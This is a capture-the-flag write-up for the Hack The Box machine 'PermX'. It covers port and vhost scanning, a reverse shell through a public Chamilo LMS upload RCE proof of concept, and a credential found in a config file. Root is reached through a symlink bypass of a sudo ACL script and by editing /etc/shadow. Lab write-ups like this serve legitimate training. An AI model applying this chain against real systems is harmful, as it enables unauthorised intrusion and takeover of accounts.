# PermX CTF

## Initial foothold :

### Nmap discovery :

```bash
Nmap discovery :
┌──(david㉿kali)-[~]
└─$ sudo nmap -p- -sV -sC 10.129.219.20
[sudo] password for david: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-08 15:02 CEST
Nmap scan report for 10.129.219.20
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.83 seconds
```
We add http://permx.htb to our hosts file 

### Vhost scan with gobuster :

Since there is a redirection for each domain with status 302 I decided to put the output in a file then with a grep command get rid of the junk :

```bash
┌──(david㉿kali)-[/mnt/kali-extended/hackthebox]
└─$ gobuster vhost -u http://permx.htb/ -w /usr/share/wordlists/dns/bitquark-subdomains-top100000.txt  --append-domain > out.txt

┌──(david㉿kali)-[/mnt/kali-extended/hackthebox]
└─$ grep -v "Status: 302" out.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://permx.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/dns/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: lms.permx.htb Status: 200 [Size: 19347]
Found: *.permx.htb Status: 400 [Size: 301]
```
We found a subdomain we add it to our hosts file 

### Directory scan on http://lms.permx.htb/ with gobuster :

```bash
┌──(david㉿kali)-[/mnt/kali-extended/hackthebox]
└─$ gobuster dir -u http://lms.permx.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,html,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lms.permx.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/terms.php            (Status: 200) [Size: 16127]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
/index.php            (Status: 200) [Size: 19356]
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/robots.txt           (Status: 200) [Size: 748]
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/user.php             (Status: 302) [Size: 0] [--> whoisonline.php]
/license.txt          (Status: 200) [Size: 1614]
/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/vendor               (Status: 301) [Size: 315] [--> http://lms.permx.htb/vendor/]
/certificates         (Status: 301) [Size: 321] [--> http://lms.permx.htb/certificates/]
/custompages          (Status: 301) [Size: 320] [--> http://lms.permx.htb/custompages/]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
Progress: 566832 / 566836 (100.00%)
===============================================================
Finished
===============================================================
```
On the formular I decided to use the default credentials to try :
admin:DigitalOcean7
But wihtout result.

So i search for cve and found this POC : https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc?tab=readme-ov-file
It works great after following the procedure we have a reverse shell

## Privilege escalation from www-data to mtz :

I run a simple python server on my local machine 
And retrieve a linpeas executable with wget on the remote machine

After running linpeas I found a password on a php configuration file :
![password](https://image.noelshack.com/fichiers/2024/28/1/1720456843-screenshot-from-2024-07-08-16-19-59.png)

Don't be confuse by the bcrypt in the log file the password is not encrypted

So we have the following credentials mtz:03F6lY3uXAP2bkW8

Congrats we can cat the user file in the home directory

## Privelege escalation from mtz to root :

I run sudo -l :

```bash
mtz@permx:~$ sudo -l
sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```
Good we can run alc.sh as root user, we check the file :

```bash
mtz@permx:~$ cat /opt/acl.sh	
cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
We can see that there is a flaw here, the check "$target" != /home/mtz/* || "$target" == *..* can be bypassed by using a symlink. For example, creating a symlink to the root folder

```bash
ln -s / root_symlink
```
And executing the script like this :
```bash
sudo /opt/acl.sh mtz rwx /home/mtz/root_symlink/etc/shadow
```
Will allow us to see the content of /etc/shadow and modify it !

In our local machine we type the following command and type test when it asked for a password :

```bash
┌──(david㉿kali)-[~]
└─$ mkpasswd --method=yescrypt
Password: 
$y$j9T$eMM9aLbHznCE2omQKTwRG1$rM3Umy9s5ucyGAI6MSd9JxPgy7Fli8Gbf9UdgpB6Ze4
```
We add the hash to the /etc/shadow file and we su as root with the new password and you can cat the root.txt file 
